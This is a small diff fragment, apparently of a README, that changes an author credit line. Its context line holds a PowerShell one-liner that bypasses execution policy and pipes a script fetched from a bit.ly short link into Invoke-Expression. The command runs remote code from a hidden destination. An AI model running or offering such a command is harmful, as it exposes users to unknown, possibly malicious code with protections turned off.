@@ -12,4 +12,4 @@ powershell -ExecutionPolicy Bypass -c "irm bit.ly/4dCsoVk | iex"
 
 program other soon..💤
 
-by @Nopparatz1238
+By [@me](https://github.com/Nopparatz1238)
